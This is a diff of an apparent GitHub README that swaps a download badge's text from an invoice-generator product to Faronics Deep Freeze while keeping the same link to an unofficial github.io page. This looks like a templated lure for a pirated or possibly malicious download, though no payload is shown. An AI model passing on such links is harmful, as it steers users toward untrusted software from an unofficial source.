@@ -6,7 +6,7 @@
      alt="Faronics Deep Freeze Logo" 
      style="width: 100%; height: auto; display: block;">
 
-[![Get the Software](https://img.shields.io/badge/🚀_Get_Invoice_Generator_Software-Now-blue?style=for-the-badge)](https://iovsyukova996.github.io/.github/faronics-deep-freeze)
+[![Get the Software](https://img.shields.io/badge/🚀_Get_faronics_deep_freeze_Software-Now-blue?style=for-the-badge)](https://iovsyukova996.github.io/.github/faronics-deep-freeze)
 
 ---
 
